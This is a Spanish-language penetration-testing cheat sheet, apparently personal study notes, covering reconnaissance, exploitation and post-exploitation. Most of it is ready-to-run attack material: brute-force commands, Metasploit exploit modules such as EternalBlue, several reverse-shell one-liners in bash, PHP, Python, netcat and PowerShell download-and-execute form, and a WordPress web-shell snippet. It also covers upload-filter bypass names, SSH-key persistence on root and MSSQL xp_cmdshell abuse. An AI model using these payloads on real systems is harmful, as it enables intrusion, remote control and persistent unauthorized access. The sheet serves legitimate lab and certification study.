Obtención de info

whois (información general)

site:WEB filetype:cfg
mysql dump filetype:sql

/?-s // Para mostrar el código fuente en php
cutycapt --url=URL --out=captura.png [--insecure] // Hace una captura de pantalla de la web especificada

Crear diccionarios
	cewl -w DICC-OUTPUT.txt --with-numbers -a -e URL

Crawling de emails
	theharvester -d URL -b all > mail.txt (-d usa todos los motores de búsqueda)
	SIMPLYEMAIL
		git clone https://github.com/killswitch-GUI/SimplyEmail.git
		pip install fake_useragent
		pip install BeautifulSoup
		pip install docx2txt
		python SimplyEmail.py -all -e URL
Metadatos de documentos
	metagoofil -d [url] -t [tipo de documento] -l [límite] -n [intentos] -o [archivo de salida] -f [archivo html que genera el programa]

DNS
	nslookup
		set type=mx (para obtener servidores de correo corporativos)
	DNS Zone Transfers
		host -t ns [url] // Para obtener el nameserver
		host -l [url] [nameserver] // Para intentar hacer el zone transfer y que muestre toda la lista de resoluciones DNS
	dnsrecon -d URL -t axfr
	dnsenum URL
	dig a/mx/axfr domain-name-here.com @nameserver

	***************************************************************************************************************
	// script.sh URL
		for server in $(host -t ns $1 | cut -d " " -f 4); do
		host -l $1 $server | grep "has address"
		done
    ***************************************************************************************************************

Enum directorios
	gobuster -w WORDLIST -u URL -t 50 [-x php,txt,html,htm] [-k] (para saltar comprobación SSL) dir
	wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt [IP]
	dirb URL DICC
	dirb URL -z 100 (Delay ms) (no hace falta diccionario)
	dirb URL -p IP:PUERTO // Usar un proxy
	uniscan -u URL -qweds

SMB
	use auxiliary/scanner/smb/smb_version
	enum4linux -a IP
	nbtscan -r RED
	smbclient -L //IP // Ya lo hace enum4linux. Lista recursos compartidos en la máquina con null session
	smbclient -U [username] -L [IP target] // Ya lo hace enum4linux
	smbclient -W DOMAIN -U USER \\\\COMPUTER_NAME\\NETLOGON
	smb-enum-shares.nse -p445
	nbstat.nse -p 137 // Netbios expuestos
	smb-os-discovery.nse
	smb-enum-users.nse -p U:137,T:139

FTP
	use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
		definir RHOSTS (targets)

RPC
	rpcinfo -p IP [apt-get install nfs-common]
	rpcclient -U ""/"USERNAME" --command=enumprivs -N IP // Enumerar privilegios
	rpcclient -U "" (Y después ir probando entre las comillas posibles usernames) IP
		Probamos con contraseñas vacías
	nmap --script msrpc-enum IP

NFS
	nmap -sV --script=nfs-showmount IP
	showmount -e IP
	mount IP:/directorio /mnt

TELNET
	use auxiliary/scanner/telnet/telnet_version

MYSQL
	use auxiliary/admin/mysql/mysql_enum
	
MSSQL
	nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER IP

VNC
	use auxiliary/scanner/vnc/vnc_none_auth

SMTP
	nc -v [ip] 25
	VRFY [usuario] Para comprobar si ese usuario existe y su email
	HELO asdf // Devuelve el nombre de dominio
	smtp-commands.nse

SSH
	use auxiliary/scanner/ssh/ssh_enumusers

SNMP
	DEFAULT PASS
	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
	
	snmpwalk -c public IP 1.3.6.1.4.1.77.1.2.25 // Windows Users
	snmpwalk -c public IP 1.3.6.1.2.1.25.4.2.1.2 // Windows Processes
	snmpwalk -c public IP 1.3.6.1.2.1.6.13.1.3 // Open TCP Ports
	snmpwalk -c public IP 1.3.6.1.2.1.25.6.3.1.2 // Installed Software
  	snmpwalk -v 1(o la que sea) -c public(community name de snmp_login) IP

	snmpcheck -t IP -c public // Enumeración
	snmpenum -t IP
	onesixtyone -c NAMES -i HOSTS
	
	auxiliary/scanner/snmp/snmp_login
	auxiliary/scanner/snmp/snmp_enum

Wordpress
	/wp-json/wp/v2/users
	wpscan 	NO ADMITE SITIOS .WORDPRESS.COM
	--url [url] --enumerate p (plugins)
	en vez de p, vp para plugins vulnerables
	vt para temas vulnerables
	u enumera usernames

Magento
	wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
	php magescan.phar scan:all URL

CMS
	https://github.com/FlorianHeigl/cms-explorer
	https://github.com/Tuhinshubhra/CMSeeK



#################################################################################################
#################################################################################################
#################################################################################################

Explotación

METASPLOIT
	service postgresql start && msfdb init && msfconsole

JAVA RMI
	use exploit/multi/misc/java_rmi_server

FTP
	hydra -L USERS.txt -P PASS.txt -vV IP ftp
	use auxiliary/scanner/ftp/ftp_login
	set user_file /usr/share/metasploit-framework/data/wordlists/unix_users.txt
	touch /usr/share/metasploit-framework/data/wordlists/blank.txt
	set pass_file /usr/share/metasploit-framework/data/wordlists/blank.txt
	set user_as_pass true
  	set BRUTEFORCE_SPEED 1

TOMCAT
	use auxiliary/admin/http/tomcat_administration // Probar creds de admin
	set BLANK_PASSWORDS true
	set USER_AS_PASS true
	use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
	set BLANK_PASSWORDS true
	set USER_AS_PASS true

SMB
	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
  	put [archivo] (sube el archivo al directorio del ordenador víctima)
  	use exploit/multi/samba/usermap_script
  	Samba 3.0.
  		use auxiliary/scanner/smb/smb_ms17_010
		Si es vulnerable
			use exploit/windows/smb/ms17_010_eternalblue
  	Para WinXP =>
	smb-vuln-ms08-067.nse
	use auxiliary/scanner/smb/ms08_067_check
	use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
	payload windows/vncinject/bind_tcp

POP3
	telnet IP 110
	USER usuario
	PASS password
	list
	retr NUMERO

SSH
	hydra -L USERS.txt -P PASS.txt -vV IP ssh

MySQL
	mysql -uUSUARIO -pPASSWORD -h HOST

Reverse Shells
	Server local
		Recibida con nc -vvv -n -l -p PUERTO
	Máquina a explotar
	bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
	bash -c "bash -i >& /dev/tcp/IP Atacante/Puerto Atacante 0>&1"
	mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc
	php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
	<?php
   	 exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
     	?>
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196& (el & final la pone en background)
	/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
	/bin/sh -c "/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe"
	powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"
	Wordpress
		Editar hello.php de Hello Dolly y agregar
			if($_GET['cmd']) {
			  system($_GET['cmd']);
			  }
	NCAT
		ncat -v IP PUERTO --ssl
		ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl


Bypass de filtros
	Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo
	Para bypassear filtro de extensión, poner .nuevaExtension

	Para bypassear filtro MIME, para imagen poner
		GIF89a
		%PDF-1.4
		al inicio de la shell
		
	Bypass filtro extensión
		shell.php%00.gif
		shell.jpg.php
		shell.PhP .pHp .PHp .php5

#################################################################################################
#################################################################################################
#################################################################################################

Post Explotación

Obtener persistencia
	SSH
		ssh-keygen
		mount IP:/ /mnt
		cat .ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys

Transferencia de archivos
	nc -lvp [puerto] > [archivo a guardar]
    	nc -vv [ip] [puerto] < [archivo]

Conectarte a programa y redireccionar salida por nc**
	nc -lvvp [puerto] -e/-c cmd.exe
	nc -v [ip] [puerto]

Obtener shell desde ejecución de comandos
	nc -lvvp [puerto] // En nuestra máquina
	nc -v [ip] [puerto] -e/-c (exec o /bin/sh) /bin/bash

RPC
	Si entramos, con srvinfo obtenemos info sobre el sistema
	Con querydominfo obtenemos más info
	Con enumdomusers enumeramos los usuarios del sistema
		cat salida.txt | cut -d "[" -f 2 | cut -d "]" -f 1 | sort -u > usersRPC.txt
	Con createdomuser [nombre] si tenemos privilegios creamos un usuario
	Con getdompwinfo vemos la complejidad mínima para las contraseñas
	Con chgpasswd2 [username] [old pass] [new pass] cambiamos la contraseña
	Con lsaquery (en teoría) obtenemos el nombre de dominio

TOMCAT
	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	O también => use exploit/multi/http/tomcat_mgr_deploy
	
OPENSSL
	OpenFuck => https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
	gcc -o OpenFuck /usr/share/exploitdb/exploits/unix/remote/764.c -lcrypto

FTP
	Descargar todo de ftp => wget -m --no-passive ftp://anonymous:anonymous@IP
	
MSSQL
	Cliente MSSQL
		wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
		python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
	SELECT @@version
	SELECT HOST_NAME()
	select @@servername
	SELECT name FROM master..syslogins // Enum users
	SELECT name FROM master..sysdatabases; // Enum dbs
	SELECT DB_NAME()
	use DB
	select distinct table_name from information_schema.tables
	EXEC sp_addlogin 'user', 'pass';
	EXEC xp_cmdshell 'net user'; -- privOn
	SELECT NAME FROM sys.objects WHERE TYPE='U' // Sacar todas las tablas de una base de datos, más rápido que con sqlmap a pelo, requiere de sql-shell
	
	use auxiliary/admin/mssql/mssql_enum
	use exploit/windows/mssql/mssql_payload
		set PAYLOAD windows/meterpreter/reverse_tcp
	

